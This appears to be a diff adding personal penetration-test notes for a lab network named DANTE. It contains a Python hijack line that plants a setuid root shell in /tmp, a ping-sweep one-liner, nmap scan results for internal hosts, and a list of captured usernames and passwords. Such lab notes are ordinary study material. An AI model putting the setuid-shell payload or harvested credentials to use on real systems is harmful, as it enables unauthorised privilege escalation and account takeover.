@@ -1,0 +1,94 @@
+DANTE
+
+HIJACK PYTHON LIBARY
+import os
+os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
+
+PING SWEEP
+for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
+
+
+LIST IP
+172.16.1.5
+Not shown: 993 closed tcp ports (conn-refused)
+PORT     STATE SERVICE      VERSION
+21/tcp   open  ftp          FileZilla ftpd
+111/tcp  open  rpcbind      2-4 (RPC #100000)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000
+2049/tcp open  nlockmgr     1-4 (RPC #100021)
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+172.16.1.10
+
+172.16.1.12
+Not shown: 995 closed tcp ports (conn-refused)
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      ProFTPD
+22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
+443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
+3306/tcp open  mysql?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.94SVN%I=7%D=3/4%Time=65E5C822%P=x86_64-pc-linux-gnu%r(
+SF:NULL,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20al
+SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLi
+SF:nes,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20all
+SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest
+SF:,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowe
+SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions,4
+SF:B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\
+SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest,4B,
+SF:"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x2
+SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,4B,"G\0\
+SF:0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x
+SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionBindReqTCP,4
+SF:B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\
+SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusReques
+SF:tTCP,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20al
+SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4B,"
+SF:G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20
+SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,4B,"
+SF:G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20
+SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServerCook
+SF:ie,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allo
+SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionR
+SF:eq,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allo
+SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,4B
+SF:,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x
+SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,4B,"G
+SF:\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20t
+SF:o\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4B,"G\0\0\
+SF:x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x20
+SF:connect\x20to\x20this\x20MariaDB\x20server");
+
+172.16.1.13
+
+172.16.1.17
+Not shown: 994 closed tcp ports (conn-refused)
+PORT      STATE SERVICE          VERSION
+80/tcp    open  http             Apache httpd 2.4.41
+139/tcp   open  netbios-ssn      Samba smbd 4.6.2
+445/tcp   open  netbios-ssn      Samba smbd 4.6.2
+7000/tcp  open  afs3-fileserver?
+8080/tcp  open  http-proxy?
+10000/tcp open  http             MiniServ 1.900 (Webmin httpd)
+Service Info: Host: 127.0.0.1
+
+172.16.1.19
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.41
+8080/tcp open  http    Jetty 9.4.27.v20200227
+Service Info: Host: 127.0.0.1
+
+172.16.1.20
+172.16.1.100
+172.16.1.101
+172.16.1.102
+
+james:toyota
+baltazar:TheJoker12345!
+frank:STARS5678FORTUNE401 , TractorHeadtorchDeskmat
+margaret:Welcome1!2@3#
